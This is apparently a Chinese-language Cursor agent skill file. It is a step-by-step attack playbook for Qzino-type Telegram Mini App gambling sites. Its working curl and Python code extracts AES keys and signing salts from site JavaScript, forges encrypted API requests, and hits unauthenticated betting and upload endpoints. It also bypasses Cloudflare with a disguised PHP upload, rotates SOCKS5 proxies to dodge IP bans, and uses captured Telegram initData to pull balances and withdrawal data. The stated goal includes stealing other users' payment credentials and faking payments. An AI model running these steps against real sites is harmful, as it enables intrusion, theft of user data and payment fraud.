---
name: 太白云生·微域盘
description: >-
 授权目标上 Qzino 系 Telegram Mini App 赌 bot：title Qzino、POST /api.html、
 AES-CBC+MD5 salt、initData 短窗登录、未授权 randbet/上传、WAF bypass 上传、
 upload ban 检测、SOCKS5 IP封禁绕过、支付通道 dlpay/okpay/kkpay。
 
 芋道 /app-api TMA 走 yudao-appapi-pentest；通用 Mini App 走九阶段 telegram-mini-app。
---

> **太白云生**
> 江山如故人未还，一羽千里破云关。
> 师弟二字恩与债，逆流河底鹤难还。

# Qzino TMA 杀伤链（Cursor Skill）

## 何时用

- HTML `<title>Qzino</title>` 或 `POST /api.html`
- `/vue/config.js` + 子域农场（`qqzonghe`/`gbzonghe`/…）
- TG 赌 bot Mini App，不是芋道 REST

## 真源

1. `智道藏书/旁支传承/skills/telegram-gambling-tma-pentest/SKILL.md`
2. `传承/商心慈·白标.md`
3. `炼蛊房/yudao_appapi_probe.py`（会标 Qzino 指纹）

## 强制步骤

1. 目标在 scope。
2. 从 `/vue/index-*.js` 抽 AES key + sign salt；复制信封（sort JSON → MD5 → AES-CBC → `data=`）。
3. 未授权：`randbet` / 游戏列表 / 支付通道。
4. 用户给 initData：`chat_type=sender`，**一分钟内** login + 全套鉴权探测（单会话，勿反复 login）。
5. `upflie` 无 token 可传图；落地 OSS 静态域通常 **无 PHP 执行**，不要当 RCE 结案。
6. 证据写入案卷；支付回调仍交 `pay_matrix`。

## 不要做

- 用群聊 `chat_type=supergroup` 的 initData
- 上传风暴触发源站 ban 后还对同一 IP 连打
- 和芋道 `X-Ca-Token` 协议混用

---

## 一、指纹识别

```bash
# 访问主页获取 title
curl -sk https://<目标>/ | grep -oE '<title>[^<]+</title>'

# 检查特征路径
curl -sk https://<目标>/vue/config.js | python3 -m json.tool 2>/dev/null | head -30
curl -sk https://<目标>/api.html -X POST -d '{"act":"ping"}' | head -100

# 检查子域（qqzonghe/gbzonghe 模式）
for sub in qqzonghe gbzonghe pcba tg h5 m; do
 code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$sub.<目标根域>" --max-time 5)
 echo "$code https://$sub.<目标根域>"
done
```

---

## 二、抽取加密参数

### 2.1 从 JS 提取 AES Key 和 MD5 Salt

```bash
# 下载主入口 JS
curl -sk https://<目标>/vue/ | grep -oE 'index-[a-zA-Z0-9_-]+\.js' | sort -u

# 下载分包 JS（从主 index.js 找 import）
curl -sk https://<目标>/vue/index-<hash>.js | grep -oE '"[./]*index-[a-zA-Z0-9_-]+\.js"' | sort -u

# 从 JS 提取 AES Key（常见变量名）
curl -sk https://<目标>/vue/<分包>.js | grep -oE '(aesKey|secretKey|key|AES_KEY)\s*[:=]\s*["'"'"'][^"'"'"']{16,32}["'"'"']'

# 提取 MD5 Salt
curl -sk https://<目标>/vue/<分包>.js | grep -oE '(salt|sign_salt|md5Salt)\s*[:=]\s*["'"'"'][^"'"'"']+["'"'"']'
```

### 2.2 已知 Qzino 全局常量（每次部署可能轮换，先从 bundle 验证）

| 常量 | 值 | 用途 |
|---|---|---|
| `Hb` | `4523E51C8F78D3ED` | AES-128 key |
| `Wb` | `FA72ACE15FEB1FB2111E9AE1938550DABCCA4E52` | MD5 sign salt |

> "token 参数缺失"/"未开放" → 你的加密正确；"sign 错误" → salt 不对，重抽 bundle。

### 2.3 Python 解密工具（根据提取参数填入）

```python
import json, hashlib, base64, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# === 从 JS 抽取的参数（替换这里）===
AES_KEY = b'<16位或32位AES密钥>' # 如 b'qzinoaes12345678'
AES_IV = b'<16位IV>' # 常与 KEY 相同或固定值
SIGN_SALT = '<MD5签名盐>' # 如 'qzino2024'

def build_request(act: str, data: dict) -> dict:
 """构建 Qzino 加密请求"""
 data['act'] = act
 # Step1: JSON → 按 key 字母序排列
 sorted_str = json.dumps(data, separators=(',', ':'), sort_keys=True)
 # Step2: MD5 签名（排序后字符串 + salt）
 sign = hashlib.md5((sorted_str + SIGN_SALT).encode()).hexdigest()
 data['sign'] = sign
 # Step3: AES-CBC 加密
 cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
 encrypted = cipher.encrypt(pad(json.dumps(data).encode(), 16))
 return {'data': base64.b64encode(encrypted).decode()}

def parse_response(resp_b64: str) -> dict:
 """解密响应；空串 / 解密失败时返回原始内容"""
 if not resp_b64:
 return {}
 try:
 raw = base64.b64decode(resp_b64)
 cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
 decrypted = unpad(cipher.decrypt(raw), 16)
 return json.loads(decrypted.decode())
 except Exception as e:
 print(f"[parse_response ERR] {e} raw={resp_b64[:80]}")
 return {}

# 测试未授权接口（无 token）
import requests
payload = build_request('get_game_list', {'type': 1, 'page': 1})
resp = requests.post('https://<目标>/api.html', data=payload, verify=False, timeout=15)
print(resp.status_code, resp.text[:300])
```

---

## 三、未授权接口探测

### 3.1 游戏列表（无需 token）

```bash
# 直接 POST api.html（部分接口无需鉴权）
curl -sk https://<目标>/api.html -X POST \
 -d 'act=get_game_list&type=1' \
 -H 'Content-Type: application/x-www-form-urlencoded' | head -200

# 支付通道列表（常无鉴权）
curl -sk https://<目标>/api.html -X POST \
 -d 'act=get_pay_type' \
 -H 'Content-Type: application/x-www-form-urlencoded' | head -100
```

### 3.2 randbet（随机押注，无需身份）

```bash
# randbet 接口探测（Qzino 常见未授权面）
curl -sk https://<目标>/api.html -X POST \
 -d 'act=randbet&type=1&money=1' | head -200

# 或加密版
python3 -c "
# 使用上面的 build_request 函数
payload = build_request('randbet', {'type': 1, 'money': 1})
import requests
resp = requests.post('https://<目标>/api.html', data=payload, verify=False, timeout=15)
print(resp.text[:300])
"
```

### 3.3 文件上传（upflie，无 token）

```bash
# 探测 upflie 接口（OSS 上传，通常无 PHP 执行）
curl -sk https://<目标>/api.html?act=upflie -X POST \
 -F 'file=@/tmp/test.jpg' | head -200

# 验证上传响应（若成功，检查 OSS 地址）
# 上传成功 → OSS 静态 URL → 不是 RCE，只记录未授权上传
```

**WAF bypass（CloudFlare 拦 PHP body）**：
- 直接 body 含 `<?php` / `<?=` / `<html>` → CF 502
- `<script language="php">…</script>` **绕过 WAF** 可上传，但 OSS 静态域无 PHP 执行，仍不是 RCE
- 文件落地：`oss.<domain>/uploads/<date>/<md5>.ext`，Content-Type 固定 `image/png`

**upload storm → IP ban 检测**：
- 单 IP 连续 ~10+ 次上传 → 源站封 IP，所有请求返回 CF 502（GET/POST 均失败）
- 检测：`curl -s https://r.jina.ai/https://<目标>/` 返回 200 → 你的 IP 被封，站点正常
- 封禁持续 10–60+ 分钟；换 IP/SOCKS5 代理解决

---

## 四、initData 登录（用户提供 TG 会话）

```python
import requests, json

# Telegram initData（用户从 TG Mini App 复制，一分钟内有效）
INIT_DATA = "<用户提供的 initData>" # 格式: query_id=...&user=...&auth_date=...&hash=...

# 立即登录（不要重复 login，单会话）
def tg_login(base_url: str, init_data: str) -> str:
 """登录并返回 token"""
 # 根据 Qzino 具体 login 接口（从 JS 抽取）
 payload = build_request('login', {
 'init_data': init_data,
 'chat_type': 'sender' # 必须是 sender，不要用 supergroup
 })
 resp = requests.post(f'{base_url}/api.html', data=payload, verify=False, timeout=20)
 try:
 raw_data = resp.json().get('data', '')
 except Exception:
 print(f"[tg_login] non-JSON: {resp.text[:200]}")
 return ''
 data = parse_response(raw_data)
 token = data.get('token') or data.get('access_token')
 print(f'Login status: {data.get("code")} token: {token[:20] if token else "NONE"}...')
 return token

TOKEN = tg_login('https://<目标>', INIT_DATA)

# 立即探测鉴权接口（不浪费 token 窗口期）
def auth_request(act: str, extra: dict = None) -> dict:
 if extra is None:
 extra = {}
 payload = build_request(act, {'token': TOKEN, **extra})
 resp = requests.post('https://<目标>/api.html', data=payload, verify=False, timeout=15)
 try:
 data = resp.json().get('data', '')
 except Exception:
 print(f"[auth_request] non-JSON response: {resp.text[:200]}")
 return {}
 return parse_response(data)

# 用户信息
print(json.dumps(auth_request('get_user_info'), ensure_ascii=False, indent=2))
# 余额
print(json.dumps(auth_request('get_balance'), ensure_ascii=False, indent=2))
# 提现记录
print(json.dumps(auth_request('get_withdraw_list', {'page': 1}), ensure_ascii=False, indent=2))
# 充值地址
print(json.dumps(auth_request('get_recharge_address'), ensure_ascii=False, indent=2))
```

---

## 4.5 IP 封禁绕过（SOCKS5）

目标源站对数据中心 IP 封禁范围很广，10 个代理约只 1 个存活：

```bash
# 安装 pysocks（uv 环境）
uv pip install --python python3 pysocks

# 验证每个代理是否可用
for proxy in IP1:50101:user:pass IP2:50101:user:pass; do
 IP=$(echo $proxy | cut -d: -f1)
 PORT=$(echo $proxy | cut -d: -f2)
 AUTH="$(echo $proxy | cut -d: -f3):$(echo $proxy | cut -d: -f4)"
 code=$(curl -s --socks5-hostname "$IP:$PORT" -U "$AUTH" \
 -o /dev/null -w "%{http_code}" --max-time 8 "https://<目标>/api.html" -X POST -d 'act=ping')
 echo "$code $proxy"
done
# 找到第一个 200 → 固定该代理，后续请求通过它
```

- 频率控制：即使通过健康代理，每次请求间隔 `time.sleep(0.2–3)`，上传端点不要连打

## 五、支付回调 + pay_matrix

```bash
# 发现支付回调接口后交 pay_matrix 处理
python3 炼蛊房/pay_matrix.py \
 --base https://<目标> --handles Epay,USDT \
 --trade-no <订单号> --money 10 \
 --pay-url '<跳转URL>' \
 --case <案卷>
```

---

## 六、成功口径

| 级别 | 条件 |
|------|------|
| L1 | 确认 Qzino 指纹，抽出 AES Key 和 Salt |
| L2 | 命中未授权接口（randbet/游戏列表/支付通道）或 initData 登录成功 |
| L3 | 读出其他用户数据/支付凭据或完成假支付验证 |

## 七、证据写入

```bash
mkdir -p 案卷/<案卷>/qzino/
echo "AES_KEY=$(cat /tmp/aes_key.txt)" > 案卷/<案卷>/qzino/creds.txt
curl -sk https://<目标>/api.html ... > 案卷/<案卷>/qzino/unauth_api.json
```
